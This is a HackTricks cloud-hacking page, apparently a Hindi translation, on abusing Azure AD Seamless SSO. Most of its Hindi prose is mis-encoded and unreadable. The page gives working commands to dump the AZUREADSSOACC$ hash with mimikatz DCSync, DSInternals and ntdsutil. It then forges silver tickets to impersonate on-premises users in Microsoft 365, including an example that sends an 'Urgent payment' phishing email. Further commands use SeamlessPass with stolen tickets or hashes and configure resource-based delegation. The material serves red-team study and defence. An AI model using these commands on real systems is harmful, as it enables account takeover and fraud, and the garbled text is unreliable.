# Az - Seamless SSO

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso) Azure Active Directory Seamless Single Sign-On (Azure AD Seamless SSO) ‡§∏‡•ç‡§µ‡§ö‡§æ‡§≤‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á **‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§∏‡§æ‡§á‡§® ‡§á‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡§¨ ‡§µ‡•á ‡§Ö‡§™‡§®‡•á ‡§ï‡•â‡§∞‡•ç‡§™‡•ã‡§∞‡•á‡§ü ‡§â‡§™‡§ï‡§∞‡§£‡•ã‡§Ç ‡§™‡§∞ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç** ‡§ú‡•ã ‡§Ü‡§™‡§ï‡•á ‡§ï‡•â‡§∞‡•ç‡§™‡•ã‡§∞‡•á‡§ü ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§∏‡•á ‡§ú‡•Å‡§°‡§º‡•á ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§ú‡§¨ ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, **‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã Azure AD ‡§Æ‡•á‡§Ç ‡§∏‡§æ‡§á‡§® ‡§á‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§™‡§®‡•á ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ü‡§æ‡§á‡§™ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡•Ä ‡§π‡•à**, ‡§î‡§∞ ‡§Ü‡§Æ‡§§‡•å‡§∞ ‡§™‡§∞, ‡§Ø‡§π‡§æ‡§Ç ‡§§‡§ï ‡§ï‡§ø ‡§Ö‡§™‡§®‡•á ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§®‡§æ‡§Æ ‡§≠‡•Ä ‡§ü‡§æ‡§á‡§™ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ø‡§π ‡§∏‡•Å‡§µ‡§ø‡§ß‡§æ ‡§Ü‡§™‡§ï‡•á ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§Ü‡§™‡§ï‡•á ‡§ï‡•ç‡§≤‡§æ‡§â‡§°-‡§Ü‡§ß‡§æ‡§∞‡§ø‡§§ ‡§Ö‡§®‡•Å‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó‡•ã‡§Ç ‡§§‡§ï ‡§Ü‡§∏‡§æ‡§® ‡§™‡§π‡•Å‡§Ç‡§ö ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à ‡§¨‡§ø‡§®‡§æ ‡§ï‡§ø‡§∏‡•Ä ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§ë‡§®-‡§™‡•ç‡§∞‡§ø‡§Æ‡§æ‡§á‡§∏‡•á‡§∏ ‡§ò‡§ü‡§ï‡•ã‡§Ç ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§ï‡•á‡•§

<figure><img src="../../../../.gitbook/assets/image (275).png" alt=""><figcaption><p><a href="https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso-how-it-works">https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso-how-it-works</a></p></figcaption></figure>

‡§¨‡•Å‡§®‡§ø‡§Ø‡§æ‡§¶‡•Ä ‡§∞‡•Ç‡§™ ‡§∏‡•á Azure AD Seamless SSO **‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§∏‡§æ‡§á‡§® ‡§á‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à** ‡§ú‡§¨ ‡§µ‡•á **‡§è‡§ï ‡§ë‡§®-‡§™‡•ç‡§∞‡§ø‡§Æ ‡§°‡•ã‡§Æ‡•á‡§® ‡§∏‡•á ‡§ú‡•Å‡§°‡§º‡•á ‡§™‡•Ä‡§∏‡•Ä ‡§™‡§∞ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç**‡•§

‡§Ø‡§π [**PHS (Password Hash Sync)**](phs-password-hash-sync.md) ‡§î‡§∞ [**PTA (Pass-through Authentication)**](pta-pass-through-authentication.md) ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§ø‡§§ ‡§π‡•à‡•§

‡§°‡•á‡§∏‡•ç‡§ï‡§ü‡•â‡§™ SSO **‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡•Ä‡§ï‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è Kerberos** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à‡•§ ‡§ú‡§¨ ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, Azure AD Connect ‡§è‡§ï **‡§ï‡§Ç‡§™‡•ç‡§Ø‡•Ç‡§ü‡§∞ ‡§ñ‡§æ‡§§‡§æ ‡§¨‡§®‡§æ‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡•á AZUREADSSOACC`$`** ‡§ï‡§π‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§ë‡§®-‡§™‡•ç‡§∞‡§ø‡§Æ AD ‡§Æ‡•á‡§Ç‡•§ `AZUREADSSOACC$` ‡§ñ‡§æ‡§§‡•á ‡§ï‡§æ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° **‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§ï‡•á ‡§¶‡•å‡§∞‡§æ‡§® Azure AD ‡§ï‡•ã ‡§∏‡•ç‡§™‡§∑‡•ç‡§ü ‡§™‡§æ‡§† ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§≠‡•á‡§ú‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à**‡•§

**Kerberos ‡§ü‡§ø‡§ï‡§ü** **‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ï‡•á NTHash (MD4)** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á **‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü** ‡§ï‡§ø‡§è ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ Azure AD ‡§≠‡•á‡§ú‡•á ‡§ó‡§è ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ü‡§ø‡§ï‡§ü‡•ã‡§Ç ‡§ï‡•ã ‡§°‡§ø‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

**Azure AD** ‡§è‡§ï **‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü** (https://autologon.microsoftazuread-sso.com) ‡§ï‡•ã ‡§â‡§ú‡§æ‡§ó‡§∞ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡•ã Kerberos **‡§ü‡§ø‡§ï‡§ü** ‡§∏‡•ç‡§µ‡•Ä‡§ï‡§æ‡§∞ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§°‡•ã‡§Æ‡•á‡§®-‡§ú‡•ã‡§°‡§º‡•á ‡§ó‡§è ‡§Æ‡§∂‡•Ä‡§® ‡§ï‡§æ ‡§¨‡•ç‡§∞‡§æ‡§â‡§ú‡§º‡§∞ SSO ‡§ï‡•á ‡§≤‡§ø‡§è ‡§á‡§® ‡§ü‡§ø‡§ï‡§ü‡•ã‡§Ç ‡§ï‡•ã ‡§á‡§∏ ‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü ‡§™‡§∞ ‡§Ö‡§ó‡•ç‡§∞‡•á‡§∑‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

### On-prem -> cloud

‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡§æ **‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°** **`AZUREADSSOACC$` ‡§ï‡§≠‡•Ä ‡§®‡§π‡•Ä‡§Ç ‡§¨‡§¶‡§≤‡§§‡§æ**‡•§ ‡§á‡§∏‡§≤‡§ø‡§è, ‡§è‡§ï ‡§°‡•ã‡§Æ‡•á‡§® ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï **‡§á‡§∏ ‡§ñ‡§æ‡§§‡•á ‡§ï‡•á ‡§π‡•à‡§∂ ‡§ï‡•ã ‡§∏‡§Æ‡§ù‡•å‡§§‡§æ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à**, ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§á‡§∏‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó **‡§∏‡§ø‡§≤‡•ç‡§µ‡§∞ ‡§ü‡§ø‡§ï‡§ü ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è** Azure ‡§∏‡•á **‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§ë‡§®-‡§™‡•ç‡§∞‡§ø‡§Æ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•ã ‡§∏‡§ø‡§Ç‡§ï ‡§ï‡§∞‡§®‡•á** ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:
```powershell
# Dump hash using mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit

# Dump hash using https://github.com/MichaelGrafnetter/DSInternals
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso -Server lon-dc1.contoso.local

# Dump using ntdsutil and DSInternals
## Dump NTDS.dit
ntdsutil "ac i ntds" "ifm‚Äù "create full C:\temp" q q
## Extract password
Install-Module DSInternals
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hexos
```
‡§Ü‡§™ ‡§Ö‡§¨ ‡§π‡•à‡§∂ ‡§ï‡•á ‡§∏‡§æ‡§• **‡§∏‡§ø‡§≤‡•ç‡§µ‡§∞ ‡§ü‡§ø‡§ï‡§ü‡•ç‡§∏ ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§®** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```powershell
# Get users and SIDs
Get-AzureADUser | Select UserPrincipalName,OnPremisesSecurityIdentifier

# Create a silver ticket to connect to Azure with mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin /sid:S-1-5-21-123456789-1234567890-123456789 /id:1105 /domain:domain.local /rc4:<azureadssoacc hash> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:12349e088b2c13d93833d0ce947676dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit

# Create silver ticket with AADInternal to access Exchange Online
$kerberos=New-AADIntKerberosTicket -SidString "S-1-5-21-854168551-3279074086-2022502410-1104" -Hash "097AB3CBED7B9DD6FE6C992024BC38F4"
$at=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain company.com
## Send email
Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
```
To utilize the silver ticket, the following steps should be executed:

1. **Initiate the Browser:** Mozilla Firefox should be launched.
2. **Configure the Browser:**
* Navigate to **`about:config`**.
* Set the preference for [network.negotiate-auth.trusted-uris](https://github.com/mozilla/policy-templates/blob/master/README.md#authentication) to the specified [values](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#ensuring-clients-sign-in-automatically):
* `https://aadg.windows.net.nsatc.net`
* `https://autologon.microsoftazuread-sso.com`
3. **Access the Web Application:**
* Visit a web application that is integrated with the organization's AAD domain. A common example is [Office 365](https://portal.office.com/).
4. **Authentication Process:**
* At the logon screen, the username should be entered, leaving the password field blank.
* To proceed, press either TAB or ENTER.

{% hint style="success" %}
‡§Ø‡§π MFA ‡§ï‡•ã ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§Ø‡§¶‡§ø ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•à
{% endhint %}

#### Option 2 without dcsync - SeamlessPass

It's also possible to perform this attack **without a dcsync attack** to be more stealth as [explained in this blog post](https://malcrove.com/seamlesspass-leveraging-kerberos-tickets-to-access-the-cloud/). For that you only need one of the following:

* **A compromised user's TGT:** Even if you don't have one but the user was compromised, you can get one using fake TGT delegation trick implemented in many tools such as [Kekeo](https://x.com/gentilkiwi/status/998219775485661184) and [Rubeus](https://posts.specterops.io/rubeus-now-with-more-kekeo-6f57d91079b9).
* **Golden Ticket**: If you have the KRBTGT key, you can create the TGT you need for the attacked user.
* **A compromised user‚Äôs NTLM hash or AES key:** SeamlessPass will communicate with the domain controller with this information to generate the TGT
* **AZUREADSSOACC$ account NTLM hash or AES key:** With this info and the user‚Äôs Security Identifier (SID) to attack it's possible to create a service ticket an authenticate with the cloud (as performed in the previous method).

Finally, with the TGT it's possible to use the tool [**SeamlessPass**](https://github.com/Malcrove/SeamlessPass) with:

{% code overflow="wrap" %}
```
seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -tgt <base64_TGT>
```
{% endcode %}

Firefox ‡§ï‡•ã seamless SSO ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•á‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä [**‡§á‡§∏ ‡§¨‡•ç‡§≤‡•â‡§ó ‡§™‡•ã‡§∏‡•ç‡§ü ‡§Æ‡•á‡§Ç**](https://malcrove.com/seamlesspass-leveraging-kerberos-tickets-to-access-the-cloud/) ‡§Æ‡§ø‡§≤ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§

#### ~~‡§ï‡•ç‡§≤‡§æ‡§â‡§°-‡§ï‡•á‡§µ‡§≤ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è Kerberos ‡§ü‡§ø‡§ï‡§ü ‡§¨‡§®‡§æ‡§®‡§æ~~ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

‡§Ø‡§¶‡§ø Active Directory ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï‡•ã‡§Ç ‡§ï‡•á ‡§™‡§æ‡§∏ Azure AD Connect ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§π‡•à, ‡§§‡•ã ‡§µ‡•á **‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§ï‡•ç‡§≤‡§æ‡§â‡§°-‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è SID ‡§∏‡•á‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**‡•§ ‡§á‡§∏ ‡§§‡§∞‡§π Kerberos **‡§ü‡§ø‡§ï‡§ü** **‡§ï‡•ç‡§≤‡§æ‡§â‡§°-‡§ï‡•á‡§µ‡§≤ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≠‡•Ä ‡§¨‡§®‡§æ‡§è ‡§ú‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**‡•§ ‡§è‡§ï‡§Æ‡§æ‡§§‡•ç‡§∞ ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§Ø‡§π ‡§π‡•à ‡§ï‡§ø SID ‡§è‡§ï ‡§â‡§ö‡§ø‡§§ [SID](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778824\(v=ws.10\)) ‡§π‡•ã‡•§

{% hint style="danger" %}
‡§ï‡•ç‡§≤‡§æ‡§â‡§°-‡§ï‡•á‡§µ‡§≤ ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡§æ SID ‡§Ö‡§¨ **Microsoft ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§Ö‡§µ‡§∞‡•Å‡§¶‡•ç‡§ß** ‡§π‡•à‡•§\
‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è ‡§¶‡•á‡§ñ‡•á‡§Ç [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
{% endhint %}

### ‡§ë‡§®-‡§™‡•ç‡§∞‡•á‡§Æ -> ‡§ï‡•ç‡§≤‡§æ‡§â‡§° ‡§∞‡§ø‡§∏‡•ã‡§∞‡•ç‡§∏ ‡§Ü‡§ß‡§æ‡§∞‡§ø‡§§ ‡§∏‡•Ä‡§Æ‡§ø‡§§ ‡§™‡•ç‡§∞‡§§‡§ø‡§®‡§ø‡§ß‡§ø‡§§‡•ç‡§µ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

‡§ï‡•ã‡§à ‡§≠‡•Ä ‡§ú‡•ã ‡§á‡§∏ ‡§ñ‡§æ‡§§‡•á ‡§Æ‡•á‡§Ç ‡§ï‡§Ç‡§™‡•ç‡§Ø‡•Ç‡§ü‡§∞ ‡§ñ‡§æ‡§§‡•ã‡§Ç (`AZUREADSSOACC$`) ‡§ï‡§æ ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§® ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§µ‡§π **‡§ñ‡§æ‡§§‡•á ‡§™‡§∞ ‡§è‡§ï ‡§∏‡§Ç‡§∏‡§æ‡§ß‡§® ‡§Ü‡§ß‡§æ‡§∞‡§ø‡§§ ‡§∏‡•Ä‡§Æ‡§ø‡§§ ‡§™‡•ç‡§∞‡§§‡§ø‡§®‡§ø‡§ß‡§ø‡§§‡•ç‡§µ ‡§ï‡•ã ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§á‡§∏‡•á ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à**‡•§
```python
python rbdel.py -u <workgroup>\\<user> -p <pass> <ip> azureadssosvc$
```
## References

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso)
* [https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [TR19: ‡§Æ‡•à‡§Ç ‡§Ü‡§™‡§ï‡•á ‡§ï‡•ç‡§≤‡§æ‡§â‡§° ‡§Æ‡•á‡§Ç ‡§π‡•Ç‡§Å, ‡§∏‡§≠‡•Ä ‡§ï‡•á ‡§à‡§Æ‡•á‡§≤ ‡§™‡§¢‡§º ‡§∞‡§π‡§æ ‡§π‡•Ç‡§Å - Active Directory ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á Azure AD ‡§π‡•à‡§ï ‡§ï‡§∞‡§®‡§æ](https://www.youtube.com/watch?v=JEIR5oGCwdg)

{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* **üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**telegram ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **Twitter** üê¶ ‡§™‡§∞ ‡§π‡§Æ‡•á‡§Ç **‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ‡§ó‡§ø‡§ü‡§π‡§¨ ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PR ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}
